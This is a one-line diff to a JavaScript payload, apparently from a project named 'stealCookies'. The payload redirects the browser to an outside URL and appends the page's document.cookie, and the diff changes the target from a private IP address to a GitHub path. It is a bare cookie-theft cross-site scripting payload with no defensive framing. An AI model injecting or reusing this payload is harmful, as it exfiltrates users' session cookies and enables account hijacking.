@@ -1,1 +1,1 @@
-window.location='http://192.168.1.114/demo.php?cookie'+escape(document.cookie)
+window.location='https://github.com/malekAbuliala/stealCookies/demo.php?cookie'+escape(document.cookie)
